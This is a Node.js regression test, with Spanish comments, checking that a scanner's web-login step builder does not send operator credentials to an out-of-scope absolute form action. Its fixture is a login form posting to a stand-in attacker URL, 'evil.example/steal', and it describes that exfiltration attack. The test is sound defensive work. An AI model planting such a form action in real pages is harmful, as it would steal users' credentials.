#!/usr/bin/env node
/**
 * detectLoginFormAction()/buildLoginSteps() resolvían el action del <form>
 * de login (potencialmente absoluto, del HTML del propio target) sin
 * chequear scope — un target hostil podía sacar las credenciales del
 * operador hacia cualquier host con <form action="https://evil/steal">.
 */
import { detectLoginFormAction, buildLoginSteps } from "../backend/js/web-auth.js";

let ok = true;
function check(name, cond) {
  console.log((cond ? "OK" : "FAIL") + `: ${name}`);
  ok = ok && cond;
}

const evilHtml = '<form><input type="password" name="password"><input type="text" name="user"></form>'
  .replace("<form>", '<form action="https://evil.example/steal">');

// Sin root: detectLoginFormAction sigue devolviendo la URL resuelta (uso
// de bajo nivel, sin opinión) — el enforcement real vive en buildLoginSteps.
check(
  "detectLoginFormAction resuelve el action absoluto tal cual (sin opinar)",
  detectLoginFormAction(evilHtml, "https://x/login") === "https://evil.example/steal",
);

// El step del POST guarda sus args como función lazy (ctx) => [...],
// evaluada por el motor real en tiempo de ejecución con el HTML ya
// descargado — aquí la evaluamos nosotros mismos pasando el HTML hostil,
// igual que hace scripts/test-web-auth.mjs para ejercitar la misma rama.
function fakeStep(id, tool, args, when, meta) {
  return {
    id,
    tool,
    args: typeof args === "function" ? args({ webLoginPageHtml: evilHtml }) : args,
    when,
    meta,
  };
}

function argsHaveEvil(steps) {
  return steps.some((s) => Array.isArray(s.args) && s.args.some((a) => typeof a === "string" && a.includes("evil.example")));
}

const stepsNoRoot = buildLoginSteps(fakeStep, "https://x/login", "admin", "s3cret", "/tmp/c.txt");
// Sin root, buildLoginSteps no puede confirmar scope -> debe omitir el
// POST de credenciales (fail-closed), quedándose solo con el GET inicial.
check(
  "sin root: NO se genera el POST de credenciales hacia el action absoluto ajeno",
  !argsHaveEvil(stepsNoRoot),
);
check(
  "sin root: el POST queda con args null (step omitido, fail-closed)",
  stepsNoRoot[1].args === null,
);

const stepsWrongRoot = buildLoginSteps(fakeStep, "https://x/login", "admin", "s3cret", "/tmp/c.txt", "x");
check(
  "con root que NO matchea el action absoluto: tampoco se envían credenciales ahí",
  !argsHaveEvil(stepsWrongRoot),
);

// Caso legítimo: form.action relativo (sin evilHtml) resuelve al mismo
// host que loginUrl y sigue funcionando exactamente igual que antes — no
// se rompe el flujo normal, con o sin root.
function fakeStepNormal(id, tool, args, when, meta) {
  return { id, tool, args: typeof args === "function" ? args({}) : args, when, meta };
}
const normalSteps = buildLoginSteps(fakeStepNormal, "https://x/login", "admin", "s3cret", "/tmp/c.txt", "x");
check("caso normal: buildLoginSteps sigue devolviendo 2 steps (GET + POST)", normalSteps.length === 2);
check(
  "caso normal: el POST no se omite (mismo host que loginUrl, sin form.action absoluto ajeno)",
  Array.isArray(normalSteps[1].args) && normalSteps[1].args.includes("https://x/login"),
);

if (!ok) process.exit(1);
console.log("\nOK login-action-scope: credenciales del operador no se envían a un action absoluto fuera de scope");
